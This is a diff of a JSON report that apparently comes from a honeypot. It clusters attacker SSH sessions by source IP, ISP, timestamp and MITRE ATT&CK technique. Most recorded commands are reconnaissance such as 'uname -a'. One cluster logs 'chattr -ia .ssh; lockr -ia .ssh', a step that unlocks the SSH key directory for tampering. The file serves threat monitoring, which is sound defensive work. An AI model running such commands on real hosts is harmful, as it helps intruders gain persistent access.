+          "src_ip": "139.59.154.49",
+          "country": "DE",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 2,
+          "timestamp": "2026-07-10T14:01:16.158104Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-006",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 24,
+      "unique_ips": [
+        "185.242.3.195",
+        "45.198.224.120"
+      ],
+      "unique_ip_count": 2,
       "sequence_hash": "7d10fced96b38c84",
       "ttps": [],
       "representative_commands": [
@@ -939,76 +535,769 @@
       ],
       "members": [
         {
-          "session_id": "IR-1ef5e9edc93c",
+          "session_id": "IR-2a44cf5b05d5",
           "src_ip": "45.198.224.120",
           "country": "NL",
           "isp": "VPSVAULT.HOST LTD",
           "command_count": 1,
-          "timestamp": "2026-07-10T11:00:20.624122Z"
+          "timestamp": "2026-07-10T12:57:31.303221Z"
         },
         {
-          "session_id": "IR-ba8b99f0b2a4",
+          "session_id": "IR-9325e86aae41",
           "src_ip": "45.198.224.120",
           "country": "NL",
           "isp": "VPSVAULT.HOST LTD",
           "command_count": 1,
-          "timestamp": "2026-07-10T11:11:13.437192Z"
+          "timestamp": "2026-07-10T13:09:10.173887Z"
         },
         {
-          "session_id": "IR-65ce485e60aa",
+          "session_id": "IR-a373f182e2d1",
           "src_ip": "45.198.224.120",
           "country": "NL",
           "isp": "VPSVAULT.HOST LTD",
           "command_count": 1,
-          "timestamp": "2026-07-10T11:22:35.700552Z"
+          "timestamp": "2026-07-10T13:20:39.341458Z"
         },
         {
-          "session_id": "IR-f6d1f4d1fc0e",
+          "session_id": "IR-7f6186397913",
           "src_ip": "45.198.224.120",
           "country": "NL",
           "isp": "VPSVAULT.HOST LTD",
           "command_count": 1,
-          "timestamp": "2026-07-10T11:34:02.295827Z"
+          "timestamp": "2026-07-10T13:50:39.589018Z"
         },
         {
-          "session_id": "IR-1e0a4a097b4e",
+          "session_id": "IR-58ee8d22350d",
           "src_ip": "45.198.224.120",
           "country": "NL",
           "isp": "VPSVAULT.HOST LTD",
           "command_count": 1,
-          "timestamp": "2026-07-10T11:52:29.741436Z"
+          "timestamp": "2026-07-10T14:07:45.511010Z"
         },
         {
-          "session_id": "IR-9820d96594f5",
+          "session_id": "IR-d8f214436678",
           "src_ip": "45.198.224.120",
           "country": "NL",
           "isp": "VPSVAULT.HOST LTD",
           "command_count": 1,
-          "timestamp": "2026-07-10T12:03:33.751776Z"
+          "timestamp": "2026-07-10T14:19:19.010985Z"
         },
         {
-          "session_id": "IR-75977344a584",
-          "src_ip": "45.198.224.120",
-          "country": "NL",
-          "isp": "VPSVAULT.HOST LTD",
+          "session_id": "IR-0cfd7adab169",
+          "src_ip": "185.242.3.195",
+          "country": "DE",
+          "isp": "Felcloud",
           "command_count": 1,
-          "timestamp": "2026-07-10T12:14:58.976563Z"
+          "timestamp": "2026-07-10T14:25:34.967772Z"
         },
         {
-          "session_id": "IR-ecd7295ab87d",
-          "src_ip": "45.198.224.120",
-          "country": "NL",
-          "isp": "VPSVAULT.HOST LTD",
+          "session_id": "IR-ea9e4d7da6cb",
+          "src_ip": "185.242.3.195",
+          "country": "DE",
+          "isp": "Felcloud",
           "command_count": 1,
-          "timestamp": "2026-07-10T12:34:26.088826Z"
+          "timestamp": "2026-07-10T14:29:39.487036Z"
         },
         {
-          "session_id": "IR-57af9ef92911",
+          "session_id": "IR-f68bceb9ae6f",
+          "src_ip": "185.242.3.195",
+          "country": "DE",
+          "isp": "Felcloud",
+          "command_count": 1,
+          "timestamp": "2026-07-10T14:46:45.522520Z"
+        },
+        {
+          "session_id": "IR-bbcc2a7265cf",
           "src_ip": "45.198.224.120",
           "country": "NL",
           "isp": "VPSVAULT.HOST LTD",
           "command_count": 1,
-          "timestamp": "2026-07-10T12:45:53.472945Z"
+          "timestamp": "2026-07-10T14:54:38.895042Z"
+        },
+        {
+          "session_id": "IR-8e8770eacffe",
+          "src_ip": "185.242.3.195",
+          "country": "DE",
+          "isp": "Felcloud",
+          "command_count": 1,
+          "timestamp": "2026-07-10T15:06:04.548966Z"
+        },
+        {
+          "session_id": "IR-5c9033599765",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-07-10T15:10:22.633654Z"
+        },
+        {
+          "session_id": "IR-91a52a7570bc",
+          "src_ip": "185.242.3.195",
+          "country": "DE",
+          "isp": "Felcloud",
+          "command_count": 1,
+          "timestamp": "2026-07-10T15:22:40.895214Z"
+        },
+        {
+          "session_id": "IR-5dfaed8b8c8f",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-07-10T15:25:42.390624Z"
+        },
+        {
+          "session_id": "IR-7ffd0ee6dfaa",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-07-10T15:40:53.463199Z"
+        },
+        {
+          "session_id": "IR-825235a3a64f",
+          "src_ip": "185.242.3.195",
+          "country": "DE",
+          "isp": "Felcloud",
+          "command_count": 1,
+          "timestamp": "2026-07-10T15:41:51.209981Z"
+        },
+        {
+          "session_id": "IR-19fa258b5a37",
+          "src_ip": "185.242.3.195",
+          "country": "DE",
+          "isp": "Felcloud",
+          "command_count": 1,
+          "timestamp": "2026-07-10T15:58:05.328113Z"
+        },
+        {
+          "session_id": "IR-17c531730a05",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-07-10T15:59:02.363176Z"
+        },
+        {
+          "session_id": "IR-248be8fc12fe",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-07-10T16:14:02.633957Z"
+        },
+        {
+          "session_id": "IR-319a51816425",
+          "src_ip": "185.242.3.195",
+          "country": "DE",
+          "isp": "Felcloud",
+          "command_count": 1,
+          "timestamp": "2026-07-10T16:16:43.856869Z"
+        },
+        {
+          "session_id": "IR-177585fd53ce",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-07-10T16:29:31.807774Z"
+        },
+        {
+          "session_id": "IR-f1920a9c399b",
+          "src_ip": "185.242.3.195",
+          "country": "DE",
+          "isp": "Felcloud",
+          "command_count": 1,
+          "timestamp": "2026-07-10T16:32:38.645203Z"
+        },
+        {
+          "session_id": "IR-8bce7dd9cd7f",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-07-10T16:41:17.213397Z"
+        },
+        {
+          "session_id": "IR-3c84972b56bc",
+          "src_ip": "185.242.3.195",
+          "country": "DE",
+          "isp": "Felcloud",
+          "command_count": 1,
+          "timestamp": "2026-07-10T16:50:44.437442Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-007",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 52,
+      "unique_ips": [
+        "104.194.10.143"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "84f53b5af52ca45f",
+      "ttps": [
+        {
+          "id": "T1592",
+          "name": "Gather Victim Host Info"
+        }
+      ],
+      "representative_commands": [
+        "cd /proc/; cat self/cmdline"
+      ],
+      "members": [
+        {
+          "session_id": "IR-aef593b368af",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:35:36.836197Z"
+        },
+        {
+          "session_id": "IR-a31ff9e839c7",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:35:53.004721Z"
+        },
+        {
+          "session_id": "IR-33641880b11f",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:36:04.533518Z"
+        },
+        {
+          "session_id": "IR-190d43cf90ff",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:36:16.455372Z"
+        },
+        {
+          "session_id": "IR-ef3267c24978",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:36:28.569723Z"
+        },
+        {
+          "session_id": "IR-df93944437b4",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:36:40.234639Z"
+        },
+        {
+          "session_id": "IR-4dbeb0b4d053",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:36:51.917918Z"
+        },
+        {
+          "session_id": "IR-e775cc38f1aa",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:37:03.742867Z"
+        },
+        {
+          "session_id": "IR-43297bf1638b",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:37:15.434777Z"
+        },
+        {
+          "session_id": "IR-b93708f31976",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:37:27.258954Z"
+        },
+        {
+          "session_id": "IR-913bdb5659e1",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:37:39.112110Z"
+        },
+        {
+          "session_id": "IR-dc6c10e1a821",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:37:51.087278Z"
+        },
+        {
+          "session_id": "IR-41e40ae0d5a1",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:38:02.559102Z"
+        },
+        {
+          "session_id": "IR-8e634c09e453",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:38:14.659056Z"
+        },
+        {
+          "session_id": "IR-82bd641876f2",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:38:26.624101Z"
+        },
+        {
+          "session_id": "IR-ca552dedd880",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:38:38.089031Z"
+        },
+        {
+          "session_id": "IR-55fef356744e",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:38:50.126068Z"
+        },
+        {
+          "session_id": "IR-8d3ab4acf5f7",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:39:04.173624Z"
+        },
+        {
+          "session_id": "IR-8d63be6b88ff",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:39:16.260302Z"
+        },
+        {
+          "session_id": "IR-977d15af6e3d",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:39:28.429151Z"
+        },
+        {
+          "session_id": "IR-50802114616e",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:39:40.535692Z"
+        },
+        {
+          "session_id": "IR-6a3cc033228e",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:39:52.778013Z"
+        },
+        {
+          "session_id": "IR-62a70f886e9d",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:40:04.641093Z"
+        },
+        {
+          "session_id": "IR-1b4234499db9",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:40:16.948959Z"
+        },
+        {
+          "session_id": "IR-fcb1c7f0e9ae",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:40:28.750382Z"
+        },
+        {
+          "session_id": "IR-71e023e9723d",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:40:41.198102Z"
+        },
+        {
+          "session_id": "IR-059ad13a413e",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:40:53.484764Z"
+        },
+        {
+          "session_id": "IR-1a414c3c4135",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:41:05.832993Z"
+        },
+        {
+          "session_id": "IR-dd4c019705f5",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:41:18.446561Z"
+        },
+        {
+          "session_id": "IR-a314a7e76f99",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:41:30.983825Z"
+        },
+        {
+          "session_id": "IR-5bc88c181451",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:41:43.103075Z"
+        },
+        {
+          "session_id": "IR-d8b9afb174b6",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:41:55.460960Z"
+        },
+        {
+          "session_id": "IR-e83753dc0977",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:42:16.148309Z"
+        },
+        {
+          "session_id": "IR-07c3c35c9698",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:42:28.926312Z"
+        },
+        {
+          "session_id": "IR-f6d677f1b2dc",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:42:41.353660Z"
+        },
+        {
+          "session_id": "IR-819bc83b0abe",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:42:53.765487Z"
+        },
+        {
+          "session_id": "IR-f0e04b9ea40f",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:43:06.678612Z"
+        },
+        {
+          "session_id": "IR-1030d2ba60a9",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:43:19.568932Z"
+        },
+        {
+          "session_id": "IR-625b3381421c",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:43:32.538657Z"
+        },
+        {
+          "session_id": "IR-c98a29b0a37b",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:43:45.380880Z"
+        },
+        {
+          "session_id": "IR-b62f2a7edf76",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:43:57.979890Z"
+        },
+        {
+          "session_id": "IR-8b6371416da1",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:44:10.687074Z"
+        },
+        {
+          "session_id": "IR-dfc17c42a491",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:44:23.567705Z"
+        },
+        {
+          "session_id": "IR-4457754daf1a",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:44:36.718050Z"
+        },
+        {
+          "session_id": "IR-9f7f319b509e",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:44:49.628564Z"
+        },
+        {
+          "session_id": "IR-c2978911b025",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:45:02.886059Z"
+        },
+        {
+          "session_id": "IR-d33327849478",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:45:16.124321Z"
+        },
+        {
+          "session_id": "IR-2f43d9159252",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:45:29.502058Z"
+        },
+        {
+          "session_id": "IR-cb953bf22cd2",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:45:43.489974Z"
+        },
+        {
+          "session_id": "IR-eeeaef65bdcc",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:45:57.810822Z"
+        },
+        {
+          "session_id": "IR-82e8db94e48f",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:46:12.065997Z"
+        },
+        {
+          "session_id": "IR-4dbd366b2c92",
+          "src_ip": "104.194.10.143",
+          "country": "US",
+          "isp": "ReliableSite.Net LLC",
+          "command_count": 1,
+          "timestamp": "2026-07-10T13:46:26.921877Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-008",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "118.196.30.45"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "c32b4937ce8564ea",
+      "ttps": [
+        {
+          "id": "T1021.004",
+          "name": "Remote Services: SSH"
+        }
+      ],
+      "representative_commands": [
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh"
+      ],
+      "members": [
+        {
+          "session_id": "IR-8aafbebe2d87",
+          "src_ip": "118.196.30.45",
+          "country": "CN",
+          "isp": "Beijing Volcano Engine Technology Co., Ltd.",
+          "command_count": 1,
+          "timestamp": "2026-07-10T14:26:45.201539Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-009",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "106.12.38.73"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "28ba533b0f3c4df6",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "uname -a"
+      ],
+      "members": [
+        {
+          "session_id": "IR-aa99f2cc302a",
+          "src_ip": "106.12.38.73",
+          "country": "CN",
+          "isp": "Beijing Baidu Netcom Science and Technology Co., Ltd.",
+          "command_count": 1,
+          "timestamp": "2026-07-10T14:47:29.248842Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-010",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "2.58.172.185"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "7ab552f01de999cb",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "uname -s -v -n -r -m"
+      ],
+      "members": [
+        {
+          "session_id": "IR-e5d4eb528e62",
+          "src_ip": "2.58.172.185",
+          "country": "GB",
+          "isp": "rack400.com - UK Infrastructure Tel : +6531595852",
+          "command_count": 1,
+          "timestamp": "2026-07-10T16:08:17.580859Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-011",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "52.170.194.23"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "6fa4c8ac58e7a1d9",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "uname -s -m"
+      ],
+      "members": [
+        {
+          "session_id": "IR-10fb763b0d65",
+          "src_ip": "52.170.194.23",
+          "country": "US",
+          "isp": "Microsoft Corporation",
+          "command_count": 1,
+          "timestamp": "2026-07-10T16:28:49.331264Z"
         }
       ]
     }
